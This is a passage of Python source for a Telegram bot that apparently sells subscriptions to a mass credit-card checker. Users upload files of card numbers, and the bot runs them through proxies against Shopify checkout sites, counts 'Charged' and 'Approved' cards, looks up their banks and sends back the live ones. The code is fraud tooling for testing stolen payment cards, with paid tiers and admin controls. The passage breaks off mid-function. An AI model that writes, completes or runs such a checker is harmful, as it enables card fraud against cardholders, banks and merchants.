    if code not in keys_db: return await styled_reply(update, f"⚠️ 𝘐𝘯𝘷𝘢𝘭𝘪𝘥 𝘒𝘦𝘺. 𝘗𝘭𝘦𝘢𝘴𝘦 𝘤𝘩𝘦𝘤𝘬 𝘢𝘯𝘥 𝘵𝘳𝘺 𝘢𝘨𝘢𝘪𝘯.", use_gif=True)
    
    kinfo = keys_db[code]
    if kinfo["used"]: return await styled_reply(update, f"⚠️ 𝘛𝘩𝘪𝘴 𝘒𝘦𝘺 𝘩𝘢𝘴 𝘢𝘭𝘳𝘦𝘢𝘥𝘺 𝘣𝘦𝘦𝘯 𝘳𝘦𝘥𝘦𝘦𝘮𝘦𝘥.", use_gif=True)
    
    tier, days = kinfo["tier"], kinfo["days"]
    await set_user_plan(uid, tier, days)
    keys_db[code]["used"] = True
    keys_db[code]["used_by"] = uid
    redeem_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    keys_db[code]["redeemed_at"] = redeem_time
    await save_keys(keys_db)
    
    expiry_date = (datetime.now() + timedelta(days=days)).strftime('%Y-%m-%d')
    limit = get_cc_limit(tier, uid)
    user_name = update.effective_user.first_name or f"User {uid}"
    
    msg = f"""⦗ {CE_3} ⦘ 𝘚𝘶𝘣𝘴𝘤𝘳𝘪𝘱𝘵𝘪𝘰𝘯 𝘈𝘤𝘵𝘪𝘷𝘢𝘵𝘦𝘥 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺!

├ ⦗ 👤 ⦘ 𝘜𝘴𝘦𝘳: <a href="tg://user?id={uid}">{user_name}</a>
├ ⦗ {CE_1} ⦘ 𝘗𝘭𝘢𝘯: <code>{tier}</code>
├ ⦗ {CE_14} ⦘ 𝘋𝘶𝘳𝘢𝘵𝘪𝘰𝘯: <code>{days} 𝘋𝘢𝘺𝘴</code>
├ ⦗ {CE_8} ⦘ 𝘔𝘢𝘴𝘴 𝘓𝘪𝘮𝘪𝘵: <code>{limit} 𝘊𝘊𝘴</code>
╰ ⦗ {CE_4} ⦘ 𝘌𝘹𝘱𝘪𝘳𝘦𝘴 𝘖𝘯: <code>{expiry_date}</code>"""

    kb = [[create_native_button("🚀 Start Checking", callback_data="back_start")]]
    await styled_reply(update, msg, buttons=kb, use_gif=True, specific_gif=ACTIVATION_GIF)

    try:
        if ADMIN_ID:
            admin_msg = f"""⦗ 🔔 ⦘ 𝘕𝘦𝘸 𝘒𝘦𝘺 𝘙𝘦𝘥𝘦𝘦𝘮𝘦𝘥!

├ ⦗ {CE_9} ⦘ 𝘒𝘦𝘺: <code>{code}</code>
├ ⦗ 👤 ⦘ 𝘜𝘴𝘦𝘳: <a href="tg://user?id={uid}">{user_name}</a> (<code>{uid}</code>)
├ ⦗ {CE_1} ⦘ 𝘗𝘭𝘢𝘯: <code>{tier}</code>
├ ⦗ {CE_14} ⦘ 𝘋𝘶𝘳𝘢𝘵𝘪𝘰𝘯: <code>{days} 𝘋𝘢𝘺𝘴</code>
╰ ⦗ {CE_14} ⦘ 𝘛𝘪𝘮𝘦: <code>{redeem_time}</code>"""
            await styled_send(context.bot, ADMIN_ID[0], admin_msg, use_gif=True)
    except: pass

async def validate_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_ID: return
    code = context.args[0].strip() if context.args else ""
    keys_db = await load_keys()
    
    if not code: return await styled_reply(update, f"⚠️ 𝘚𝘺𝘯𝘵𝘢𝘹: <code>/validate [𝘒𝘦𝘺]</code>", use_gif=True)
    if code not in keys_db: return await styled_reply(update, f"⚠️ 𝘒𝘦𝘺 𝘯𝘰𝘵 𝘧𝘰𝘶𝘯𝘥 𝘪𝘯 𝘥𝘢𝘵𝘢𝘣𝘢𝘴𝘦.", use_gif=True)
    
    kinfo = keys_db[code]
    tier, days, used = kinfo.get("tier", "Unknown"), kinfo.get("days", 0), kinfo.get("used", False)
    used_by, gen_time, red_time = kinfo.get("used_by", "None"), kinfo.get("generated_at", "Unknown"), kinfo.get("redeemed_at", "Not yet")

    status_text = "𝘜𝘴𝘦𝘥" if used else "𝘈𝘤𝘵𝘪𝘷𝘦"
    
    msg = f"""⦗ {CE_9} ⦘ 𝘒𝘦𝘺 𝘐𝘯𝘧𝘰𝘳𝘮𝘢𝘵𝘪𝘰𝘯

├ ⦗ {CE_9} ⦘ 𝘒𝘦𝘺: <code>{code}</code>
├ ⦗ {CE_2} ⦘ 𝘚𝘵𝘢𝘵𝘶𝘴: <code>{status_text}</code>
├ ⦗ {CE_1} ⦘ 𝘗𝘭𝘢𝘯 𝘛𝘪𝘦𝘳: <code>{tier}</code>
├ ⦗ {CE_14} ⦘ 𝘋𝘶𝘳𝘢𝘵𝘪𝘰𝘯: <code>{days} 𝘋𝘢𝘺𝘴</code>
╰ ⦗ {CE_14} ⦘ 𝘎𝘦𝘯𝘦𝘳𝘢𝘵𝘦𝘥: <code>{gen_time}</code>"""

    if used:
        msg += f"\n\n├ ⦗ 👤 ⦘ 𝘙𝘦𝘥𝘦𝘦𝘮𝘦𝘥 𝘉𝘺: <code>{used_by}</code> <a href='tg://user?id={used_by}'>[𝘗𝘳𝘰𝘧𝘪𝘭𝘦]</a>"
        msg += f"\n╰ ⦗ {CE_14} ⦘ 𝘙𝘦𝘥𝘦𝘦𝘮 𝘛𝘪𝘮𝘦: <code>{red_time}</code>"
        
    await styled_reply(update, msg, use_gif=True)

async def maint_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global _MAINTENANCE_MODE
    if update.effective_user.id not in ADMIN_ID: return
    arg = context.args[0].lower() if context.args else ""
    if arg: _MAINTENANCE_MODE = (arg == 'on')
    else: _MAINTENANCE_MODE = not _MAINTENANCE_MODE
    if _MAINTENANCE_MODE: await styled_reply(update, f"⦗ {CE_11} ⦘ 𝘔𝘢𝘪𝘯𝘵𝘦𝘯𝘢𝘯𝘤𝘦 𝘔𝘰𝘥𝘦: 𝘖𝘕\n╰ 𝘈𝘭𝘭 𝘶𝘴𝘦𝘳𝘴 𝘢𝘳𝘦 𝘯𝘰𝘸 𝘣𝘭𝘰𝘤𝘬𝘦𝘥.", use_gif=True)
    else: await styled_reply(update, f"⦗ {CE_4} ⦘ 𝘔𝘢𝘪𝘯𝘵𝘦𝘯𝘢𝘯𝘤𝘦 𝘔𝘰𝘥𝘦: 𝘖𝘍𝘍\n╰ 𝘚𝘺𝘴𝘵𝘦𝘮 𝘪𝘴 𝘰𝘯𝘭𝘪𝘯𝘦 𝘧𝘰𝘳 𝘢𝘭𝘭 𝘶𝘴𝘦𝘳𝘴.", use_gif=True)

async def users_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_ID: return
    active_info = []
    for u, p in list(ACTIVE_MTXT_PROCESSES.items()):
        if not p.get("stopped"):
            gate = p.get("gate", "Unknown")
            total = p.get("total", "?")
            active_info.append(f"  ├ ⦗ 👤 ⦘ <a href='tg://user?id={u}'>User</a> (<code>{u}</code>)\n  │  ╰ 𝘎𝘢𝘵𝘦: <code>{gate}</code> | 𝘊𝘊𝘴: <code>{total}</code>")
            
    active_count = len(active_info)
    total_seen = len(USER_LAST_REQ)
    
    text = f"⦗ 🌐 ⦘ 𝘎𝘭𝘰𝘣𝘢𝘭 𝘚𝘺𝘴𝘵𝘦𝘮 𝘚𝘵𝘢𝘵𝘶𝘴\n\n"
    text += f"├ ⦗ 👥 ⦘ 𝘛𝘰𝘵𝘢𝘭 𝘚𝘦𝘴𝘴𝘪𝘰𝘯 𝘜𝘴𝘦𝘳𝘴: <code>{total_seen}</code>\n"
    text += f"├ ⦗ {CE_2} ⦘ 𝘈𝘤𝘵𝘪𝘷𝘦 𝘊𝘩𝘦𝘤𝘬𝘦𝘳𝘴: <code>{active_count}</code>\n"
    
    if active_info: text += "╰ ⦗ 🆔 ⦘ 𝘊𝘶𝘳𝘳𝘦𝘯𝘵𝘭𝘺 𝘊𝘩𝘦𝘤𝘬𝘪𝘯𝘨:\n" + "\n".join(active_info)
    else: text += "╰ ⦗ 🆔 ⦘ 𝘊𝘶𝘳𝘳𝘦𝘯𝘵𝘭𝘺 𝘊𝘩𝘦𝘤𝘬𝘪𝘯𝘨: <code>None</code>"
        
    await styled_reply(update, text, use_gif=True)

async def revoke_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_ID: return
    try: target_uid = int(context.args[0])
    except: return await styled_reply(update, f"⚠️ 𝘗𝘭𝘦𝘢𝘴𝘦 𝘱𝘳𝘰𝘷𝘪𝘥𝘦 𝘢 𝘷𝘢𝘭𝘪𝘥 𝘐𝘋.", use_gif=True)
    
    await set_user_plan(target_uid, "Free", 0)
    proc = ACTIVE_MTXT_PROCESSES.get(target_uid)
    if proc:
        proc["stopped"] = True
        for t in proc.get("tasks", []):
            if not t.done(): t.cancel()
    
    admin_msg = f"⦗ {CE_7} ⦘ 𝘈𝘤𝘤𝘦𝘴𝘴 𝘙𝘦𝘷𝘰𝘬𝘦𝘥\n├ ⦗ 👤 ⦘ 𝘜𝘴𝘦𝘳: <code>{target_uid}</code>\n╰ ⦗ {CE_2} ⦘ 𝘚𝘵𝘢𝘵𝘶𝘴: <code>𝘋𝘦𝘮𝘰𝘵𝘦𝘥 𝘵𝘰 𝘍𝘳𝘦𝘦</code>"
    await styled_reply(update, admin_msg, use_gif=True)
    try: await styled_send(context.bot, target_uid, f"⦗ {CE_7} ⦘ 𝘚𝘺𝘴𝘵𝘦𝘮 𝘈𝘭𝘦𝘳𝘵\n\n╰ 𝘠𝘰𝘶𝘳 𝘝𝘐𝘗 𝘢𝘤𝘤𝘦𝘴𝘴 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘳𝘦𝘷𝘰𝘬𝘦𝘥 𝘣𝘺 𝘵𝘩𝘦 𝘢𝘥𝘮𝘪𝘯𝘪𝘴𝘵𝘳𝘢𝘵𝘰𝘳.", use_gif=True)
    except: pass

# ----------------- CALLBACK & FILE HANDLERS -----------------
async def plans_cb_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    if _MAINTENANCE_MODE and uid not in ADMIN_ID: return await q.answer("Maintenance Break!", show_alert=True)
    cp = await get_user_plan(uid)
    plans_text = f"⦗ {CE_9} ⦘ 𝘝𝘐𝘗 𝘚𝘶𝘣𝘴𝘤𝘳𝘪𝘱𝘵𝘪𝘰𝘯 𝘗𝘭𝘢𝘯𝘴\n\n"
    for _, pi in PLANS.items():
        plans_text += f"├ ⦗ {CE_1} ⦘ <code>{pi['name']}</code>\n"
        plans_text += f"│ ├ 𝘋𝘶𝘳𝘢𝘵𝘪𝘰𝘯: <code>{pi['duration_days']} 𝘋𝘢𝘺𝘴</code>\n"
        plans_text += f"│ ├ 𝘓𝘪𝘮𝘪𝘵: <code>{get_cc_limit(pi['tier'])} 𝘊𝘊𝘴</code>\n"
        plans_text += f"│ ╰ 𝘗𝘳𝘪𝘤𝘦: <code>{pi['price']}</code>\n│\n"
    plans_text += f"╰ ⦗ 👤 ⦘ 𝘠𝘰𝘶𝘳 𝘊𝘶𝘳𝘳𝘦𝘯𝘵 𝘗𝘭𝘢𝘯 ⇾ <code>{cp.title() if cp else 'Bronze'}</code>"
    kb = [[create_native_button("⦗ 👑 ⦘ 𝘊𝘰𝘯𝘵𝘢𝘤𝘵 𝘖𝘸𝘯𝘦𝘳", url="https://t.me/Dddadddyttt")], [create_native_button("⦗ 🔙 ⦘ 𝘉𝘢𝘤𝘬", callback_data="back_start")]]
    await styled_edit(q.message, plans_text, buttons=kb)
    await q.answer()

async def back_start_cb_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    if _MAINTENANCE_MODE and uid not in ADMIN_ID: return await q.answer("Maintenance Break!", show_alert=True)
    plan = await get_user_plan(uid)
    limit = get_cc_limit(plan, uid)
    ap = "├" if uid in ADMIN_ID else "╰"
    ap_txt = f"\n\n╰ ⦗ {CE_3} ⦘ 𝘈𝘥𝘮𝘪𝘯 𝘗𝘢𝘯𝘦𝘭\n  ├ /gen [𝘗𝘭𝘢𝘯] [𝘕𝘶𝘮𝘣𝘦𝘳]\n  ├ /validate [𝘒𝘦𝘺]\n  ├ /users\n  ╰ /maint" if uid in ADMIN_ID else ""
    text = f"""⦗ {CE_2} ⦘ 𝘚𝘩𝘰𝘱𝘪𝘧𝘺 𝘝𝘐𝘗 𝘚𝘺𝘴𝘵𝘦𝘮

⦗ {CE_8} ⦘ 𝘊𝘩𝘦𝘤𝘬𝘪𝘯𝘨
╰ 𝘚𝘦𝘯𝘥 𝘢 𝘧𝘪𝘭𝘦 𝘵𝘰 𝘢𝘶𝘵𝘰-𝘴𝘵𝘢𝘳𝘵 𝘔𝘢𝘴𝘴 𝘊𝘩𝘦𝘤𝘬

⦗ {CE_11} ⦘ 𝘗𝘳𝘰𝘹𝘺 𝘔𝘢𝘯𝘢𝘨𝘦𝘳
├ /addpxy ⇾ 𝘈𝘥𝘥 𝘗𝘳𝘰𝘹𝘪𝘦𝘴
├ /proxy ⇾ 𝘝𝘪𝘦𝘸 𝘗𝘳𝘰𝘹𝘪𝘦𝘴
╰ /rmpxy ⇾ 𝘙𝘦𝘮𝘰𝘷𝘦 𝘗𝘳𝘰𝘹𝘪𝘦𝘴

⦗ 👤 ⦘ 𝘈𝘤𝘤𝘰𝘶𝘯𝘵
├ /info ⇾ 𝘠𝘰𝘶𝘳 𝘗𝘳𝘰𝘧𝘪𝘭𝘦
├ /redeem ⇾ 𝘙𝘦𝘥𝘦𝘦𝘮 𝘒𝘦𝘺
├ /fb ⇾ 𝘚𝘦𝘯𝘥 𝘍𝘦𝘦𝘥𝘣𝘢𝘤𝘬
╰ /plan ⇾ 𝘝𝘪𝘦𝘸 𝘚𝘶𝘣𝘴𝘤𝘳𝘪𝘱𝘵𝘪𝘰𝘯𝘴{ap_txt}

⦗ {CE_9} ⦘ 𝘠𝘰𝘶𝘳 𝘗𝘭𝘢𝘯 ⇾ <code>{plan.title() if plan else 'Bronze'} ({limit} 𝘓𝘪𝘮𝘪𝘵)</code>"""
    kb = [[create_native_button("⦗ 💎 ⦘ 𝘝𝘪𝘦𝘸 𝘗𝘭𝘢𝘯𝘴", callback_data="show_plans")], [create_native_button("⦗ 📢 ⦘ 𝘊𝘩𝘢𝘯𝘯𝘦𝘭", url=JOIN_CHANNEL_LINK), create_native_button("⦗ 💬 ⦘ 𝘎𝘳𝘰𝘶𝘱", url=JOIN_GROUP_LINK)]]
    await styled_edit(q.message, text, buttons=kb)
    await q.answer()

async def check_joined_cb_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    if uid in ADMIN_ID: return await q.answer("✅ Admin Access", show_alert=True)
    if await is_user_joined(uid, context.bot):
        await mark_user_joined(uid)
        await q.answer("✅ Verified!", show_alert=True)
        try: await q.message.delete()
        except: pass
        await styled_send(context.bot, uid, f"⦗ {CE_2} ⦘ 𝘚𝘩𝘰𝘱𝘪𝘧𝘺 𝘝𝘐𝘗 𝘚𝘺𝘴𝘵𝘦𝘮\n╰ 𝘚𝘦𝘯𝘥 /start 𝘵𝘰 𝘷𝘪𝘦𝘸 𝘵𝘩𝘦 𝘮𝘦𝘯𝘶.", use_gif=True)
    else:
        await q.answer("❌ Not joined yet!", show_alert=True)

async def auto_file_check_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if _MAINTENANCE_MODE and update.effective_user.id not in ADMIN_ID: return
    uid = update.effective_user.id
    USER_LAST_REQ[uid] = time.time()
    pm = await styled_reply(update, f"⦗ {CE_14} ⦘ 𝘗𝘳𝘰𝘤𝘦𝘴𝘴𝘪𝘯𝘨 𝘧𝘪𝘭𝘦 𝘥𝘢𝘵𝘢...", use_gif=True)
    try:
        if uid in ACTIVE_MTXT_PROCESSES and not ACTIVE_MTXT_PROCESSES[uid].get("stopped", True): return await styled_edit(pm, f"⚠️ 𝘈 𝘱𝘳𝘰𝘤𝘦𝘴𝘴 𝘪𝘴 𝘢𝘭𝘳𝘦𝘢𝘥𝘺 𝘢𝘤𝘵𝘪𝘷𝘦! 𝘗𝘭𝘦𝘢𝘴𝘦 𝘸𝘢𝘪𝘵.")
        doc = update.message.document
        if doc.file_size > 3 * 1024 * 1024: return await styled_edit(pm, f"⚠️ 𝘍𝘪𝘭𝘦 𝘵𝘰𝘰 𝘭𝘢𝘳𝘨𝘦! (𝘔𝘢𝘹 3𝘔𝘉)")
        if not await force_join_check(update, context): return
        
        plan = await get_user_plan(uid)
        db_proxies = await get_all_user_proxies(uid)
        if len(db_proxies) == 0: return await styled_edit(pm, f"<b>⚠️ 𝘠𝘰𝘶 𝘮𝘶𝘴𝘵 𝘢𝘥𝘥 𝘱𝘳𝘰𝘹𝘪𝘦𝘴 𝘣𝘦𝘧𝘰𝘳𝘦 𝘤𝘩𝘦𝘤𝘬𝘪𝘯𝘨! 𝘜𝘴𝘦 <code>/addpxy</code></b>")
        
        f = await context.bot.get_file(doc.file_id)
        fp = f"temp_{uid}_{int(time.time())}.txt"
        await f.download_to_drive(fp)
        async with aiofiles.open(fp, "r", encoding="utf-8", errors="ignore") as file: content = await file.read()
        os.remove(fp)
        cards = extract_cc(content)
        if not cards: return await styled_edit(pm, f"⚠️ 𝘕𝘰 𝘷𝘢𝘭𝘪𝘥 𝘤𝘢𝘳𝘥𝘴 𝘧𝘰𝘶𝘯𝘥 𝘪𝘯 𝘵𝘩𝘦 𝘧𝘪𝘭𝘦.")
        cl = get_cc_limit(plan, uid)
        if len(cards) > cl: cards = cards[:cl]
        PENDING_FILES[uid] = cards
        
        kb = [
            [create_native_button("🛍️ 𝘚𝘩𝘰𝘱𝘪𝘧𝘺 (𝘊𝘩𝘢𝘳𝘨𝘦)", callback_data="gate:Shopify"), create_native_button("🌐 𝘉𝘳𝘢𝘪𝘯𝘵𝘳𝘦𝘦 (𝘚𝘰𝘰𝘯)", callback_data="gate:soon_Braintree")],
            [create_native_button("💳 𝘚𝘵𝘳𝘪𝘱𝘦 (𝘚𝘰𝘰𝘯)", callback_data="gate:soon_Stripe"), create_native_button("🅿️ 𝘗𝘢𝘺𝘗𝘢𝘭 (𝘚𝘰𝘰𝘯)", callback_data="gate:soon_PayPal")],
            [create_native_button("❌ 𝘊𝘢𝘯𝘤𝘦𝘭", callback_data="gate:cancel")]
        ]
        await styled_edit(pm, f"⦗ {CE_4} ⦘ 𝘍𝘪𝘭𝘦 𝘓𝘰𝘢𝘥𝘦𝘥 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺\n\n├ 𝘛𝘰𝘵𝘢𝘭 𝘊𝘊𝘴: <code>{len(cards)}</code>\n╰ 𝘗𝘭𝘦𝘢𝘴𝘦 𝘴𝘦𝘭𝘦𝘤𝘵 𝘢 𝘎𝘢𝘵𝘦𝘸𝘢𝘺 𝘵𝘰 𝘴𝘵𝘢𝘳𝘵:", buttons=kb)
    except Exception as e: 
        logger.error(f"File process error: {e}")
        await styled_edit(pm, f"⚠️ 𝘌𝘳𝘳𝘰𝘳: {e}")

async def gateway_selection_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if _MAINTENANCE_MODE and update.effective_user.id not in ADMIN_ID: return
    q = update.callback_query
    uid = q.from_user.id
    gn = q.data.split(":")[1]
    if gn.startswith("soon_"): return await q.answer("⏳ Gateway is coming soon!", show_alert=True)
    await q.answer()
    if gn == "cancel":
        PENDING_FILES.pop(uid, None)
        return await styled_edit(q.message, f"⦗ {CE_7} ⦘ 𝘗𝘳𝘰𝘤𝘦𝘴𝘴 𝘊𝘢𝘯𝘤𝘦𝘭𝘭𝘦𝘥.", buttons=None)
    
    cards = PENDING_FILES.pop(uid, None)
    if not cards: return await q.answer("⚠️ Session expired.", show_alert=True)
    
    ACTIVE_MTXT_PROCESSES[uid] = {"stopped": False, "tasks": [], "total": len(cards), "gate": gn}
    await styled_edit(q.message, f"⦗ {CE_11} ⦘ 𝘗𝘳𝘦𝘱𝘢𝘳𝘪𝘯𝘨 𝘚𝘦𝘴𝘴𝘪𝘰𝘯...\n\n├ 𝘓𝘰𝘢𝘥𝘦𝘥: <code>{len(cards)} 𝘊𝘊𝘴</code>\n├ 𝘛𝘩𝘳𝘦𝘢𝘥𝘴: <code>{WORKERS}</code>\n╰ 𝘎𝘢𝘵𝘦𝘸𝘢𝘺: <code>{gn}</code>", buttons=None)
    asyncio.create_task(_run_mass_process(update, q.message, cards, ACTIVE_MTXT_PROCESSES, "stop_chk", gn, context.bot))

async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_prefix, gate_name, bot):
    uid = update.effective_user.id
    total = len(cards); checked = charged = approved = insufficient = declined = errors = 0
    st = time.time()
    sites = await get_github_sites()
    proxies = [p['proxy_url'] for p in await get_all_user_proxies(uid)] if await get_all_user_proxies(uid) else []
    http_session = await get_user_http_session(uid)
    lcd = "..."
    def is_stopped(): return process_store.get(uid, {}).get("stopped", False)

    async def dashboard_updater():
        while not is_stopped():
            await asyncio.sleep(4.0)
            if is_stopped(): break
            
            elapsed_now = int(time.time() - st)
            cpm = int((checked / elapsed_now) * 60) if elapsed_now > 0 else 0
            
            h_now, m_now, s_now = elapsed_now // 3600, (elapsed_now % 3600) // 60, elapsed_now % 60
            
            dt = f"""⦗ {CE_2} ⦘ 𝘚𝘦𝘴𝘴𝘪𝘰𝘯 𝘈𝘤𝘵𝘪𝘷𝘦...

├ ⦗ {CE_1} ⦘ 𝘎𝘢𝘵𝘦𝘸𝘢𝘺: <code>{gate_name}</code>
├ ⦗ {CE_13} ⦘ 𝘛𝘩𝘳𝘦𝘢𝘥𝘴: <code>{WORKERS}</code>
╰ ⦗ {CE_14} ⦘ 𝘛𝘪𝘮𝘦: <code>{h_now}𝘩 {m_now}𝘮 {s_now}𝘴</code>"""
            
            kb = [
                [create_native_button(f"{lcd}", callback_data="none")],
                [create_native_button(f"🟢 𝘊𝘩𝘢𝘳𝘨𝘦𝘥: {charged}", callback_data="none"), create_native_button(f"⚡ 𝘈𝘱𝘱𝘳𝘰𝘷𝘦𝘥: {approved}", callback_data="none")],
                [create_native_button(f"🟡 𝘐𝘯𝘴𝘶𝘧𝘧𝘪𝘤𝘪𝘦𝘯𝘵: {insufficient}", callback_data="none"), create_native_button(f"🔴 𝘋𝘦𝘤𝘭𝘪𝘯𝘦𝘥: {declined}", callback_data="none")],
                [create_native_button(f"📊 𝘛𝘰𝘵𝘢𝘭: {checked} / {total}", callback_data="none"), create_native_button(f"⚠️ 𝘌𝘳𝘳𝘰𝘳: {errors}", callback_data="none")],
                [create_native_button(f"🚀 𝘚𝘱𝘦𝘦𝘥: {cpm} 𝘊𝘗𝘔", callback_data="none")],
                [create_native_button("🛑 𝘚𝘵𝘰𝘱 𝘗𝘳𝘰𝘤𝘦𝘴𝘴", callback_data=f"{stop_prefix}:{uid}")]
            ]
            try: await styled_edit(msg_obj, dt, buttons=kb)
            except: pass

    ut = asyncio.create_task(dashboard_updater())
    queue = asyncio.Queue()
    for c in cards: queue.put_nowait(c)

    async def worker(wid):
        await asyncio.sleep(wid * 0.1)
        nonlocal checked, charged, approved, insufficient, declined, errors, lcd
        while not queue.empty() and not is_stopped():
            try: card = queue.get_nowait()
            except: break
            try:
                card_st = time.time()
                res = await check_card_with_retry(card, sites, proxies, http_session, gate_name, max_retries=2)
                if is_stopped(): break 
                
                card_el = time.time() - card_st
                status = res.get('status', 'Dead')
                checked += 1
                
                raw_msg = str(res.get('message', status)).replace('\n', ' ').strip()
                short_msg = (raw_msg[:30] + '..') if len(raw_msg) > 30 else raw_msg
                lcd = f"⦗ 💳 ⦘ {card[:12]}.. ⇾ {short_msg}"
                
                if status == 'Charged':
                    charged += 1
                    asyncio.create_task(_send_mass_hit(card, "Charged", res.get('message', ''), res.get('price', '-'), gate_name, uid, card_el, bot))
                    asyncio.create_task(_send_global_hit("Charged", gate_name, res.get('message', ''), res.get('price', '-'), uid, bot))
                elif status == 'Approved':
                    approved += 1; asyncio.create_task(_send_mass_hit(card, "Approved", res.get('message', ''), res.get('price', '-'), gate_name, uid, card_el, bot))
                elif status == 'Insufficient':
                    insufficient += 1
                    asyncio.create_task(_send_mass_hit(card, "Insufficient", res.get('message', ''), res.get('price', '-'), gate_name, uid, card_el, bot))
                    asyncio.create_task(_send_global_hit("Insufficient", gate_name, res.get('message', ''), res.get('price', '-'), uid, bot))
                elif status == 'Site Error': errors += 1
                else: declined += 1
            except: err += 1; checked += 1
            finally:
                queue.task_done()
                if not is_stopped(): await asyncio.sleep(DELAY)

    wt = [asyncio.create_task(worker(i)) for i in range(WORKERS)]
    process_store[uid]["tasks"] = wt + [ut]
    await asyncio.gather(*wt, return_exceptions=True)
    if not ut.done(): ut.cancel()
        
    el = int(time.time() - st)
    h, m, s = el // 3600, (el % 3600) // 60, el % 60
    avg_cpm = int((checked / el) * 60) if el > 0 else 0
    
    status_header = f"⦗ {CE_7} ⦘ 𝘗𝘳𝘰𝘤𝘦𝘴𝘴 𝘍𝘰𝘳𝘤𝘦 𝘚𝘵𝘰𝘱𝘱𝘦𝘥" if is_stopped() else f"⦗ {CE_4} ⦘ 𝘗𝘳𝘰𝘤𝘦𝘴𝘴 𝘊𝘰𝘮𝘱𝘭𝘦𝘵𝘦𝘥"
    ft = f"""{status_header}

├ ⦗ {CE_1} ⦘ 𝘎𝘢𝘵𝘦𝘸𝘢𝘺: <code>{gate_name}</code>
╰ ⦗ {CE_14} ⦘ 𝘛𝘰𝘵𝘢𝘭 𝘛𝘪𝘮𝘦: <code>{h}𝘩 {m}𝘮 {s}𝘴</code>"""

    fkb = [
        [create_native_button(f"🟢 𝘊𝘩𝘢𝘳𝘨𝘦𝘥: {charged}", callback_data="none"), create_native_button(f"⚡ 𝘈𝘱𝘱𝘳𝘰𝘷𝘦𝘥: {approved}", callback_data="none")],
        [create_native_button(f"🟡 𝘐𝘯𝘴𝘶𝘧𝘧𝘪𝘤𝘪𝘦𝘯𝘵: {insufficient}", callback_data="none"), create_native_button(f"🔴 𝘋𝘦𝘤𝘭𝘪𝘯𝘦𝘥: {declined}", callback_data="none")],
        [create_native_button(f"📊 𝘛𝘰𝘵𝘢𝘭: {checked} / {total}", callback_data="none"), create_native_button(f"⚠️ 𝘌𝘳𝘳𝘰𝘳: {errors}", callback_data="none")],
        [create_native_button(f"🚀 𝘈𝘷𝘦𝘳𝘢𝘨𝘦 𝘚𝘱𝘦𝘦𝘥: {avg_cpm} 𝘊𝘗𝘔", callback_data="none")]
    ]
    try: await styled_edit(msg_obj, ft, buttons=fkb)
    except: pass
    process_store.pop(uid, None)
    await cleanup_user_http_session(uid)

async def _send_mass_hit(card, status, message, price, gateway, uid, elapsed, bot):
    await asyncio.sleep(HIT_DELAY)
    try:
        bi = await get_bin_info(card.split("|")[0])
        
        ps = f"${str(price).replace('$', '')}" if price and price != "-" else "-"
        if status == "Charged": header = f"⦗ {CE_5} ⦘ 𝘊𝘩𝘢𝘳𝘨𝘦𝘥 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺"
        elif status == "Approved": header = f"⦗ {CE_2} ⦘ 𝘈𝘱𝘱𝘳𝘰𝘷𝘦𝘥 𝘊𝘝𝘝"
        elif status == "Insufficient": header = f"⦗ {CE_6} ⦘ 𝘐𝘯𝘴𝘶𝘧𝘧𝘪𝘤𝘪𝘦𝘯𝘵 𝘍𝘶𝘯𝘥𝘴"
        else: header = f"⦗ {CE_7} ⦘ 𝘋𝘦𝘤𝘭𝘪𝘯𝘦𝘥"
            
        country_display = f"{bi.get('country', '-')} {bi.get('flag', '')}"
        
        msg = f"""{header}

⦗ {CE_8} ⦘ 𝘊𝘢𝘳𝘥 ⇾ <code>{card}</code>

⦗ {CE_10} ⦘ 𝘙𝘦𝘴𝘱𝘰𝘯𝘴𝘦 ⇾ <code>{message}</code>

⦗ {CE_1} ⦘ 𝘎𝘢𝘵𝘦𝘸𝘢𝘺 ⇾ <code>{gateway}</code>
⦗ {CE_9} ⦘ 𝘗𝘳𝘪𝘤𝘦 ⇾ <code>{ps}</code>

⦗ 🏦 ⦘ 𝘉𝘢𝘯𝘬 𝘐𝘯𝘧𝘰
 ├ 𝘉𝘢𝘯𝘬: <code>{bi.get('bank', '-')}</code>
 ├ 𝘊𝘰𝘶𝘯𝘵𝘳𝘺: <code>{country_display}</code>
 ├ 𝘉𝘳𝘢𝘯𝘥: <code>{bi.get('brand', '-')}</code>
 ╰ 𝘛𝘺𝘱𝘦: <code>{bi.get('type', '-')} - {bi.get('level', '-')}</code>

⦗ {CE_14} ⦘ 𝘛𝘰𝘰𝘬 ⇾ <code>{elapsed:.2f} 𝘚𝘦𝘤𝘰𝘯𝘥𝘴</code>"""

        kb = [[create_native_button("⇾ 𝘖𝘸𝘯𝘦𝘳 ⇽", url="https://t.me/Dddadddyttt")]]
        await styled_send(bot, uid, msg, buttons=kb, use_gif=True)
    except: pass

async def get_bin_info(bin_code):
    try:
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=5)) as session:
            async with session.get(f"https://bins.antipublic.cc/bins/{bin_code[:6]}") as r:
                if r.status == 200:
                    d = await r.json()
                    return {"brand": d.get("brand", "-"), "type": d.get("type", "-"), "level": d.get("level", "-"), "bank": d.get("bank", "-"), "country": d.get("country_name", "-"), "country_code": d.get("country", ""), "flag": d.get("country_flag", "")}
    except: pass
    return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "country_code": "", "flag": ""}

async def check_card_api(card, site, proxy, session, gateway_name):
    try:
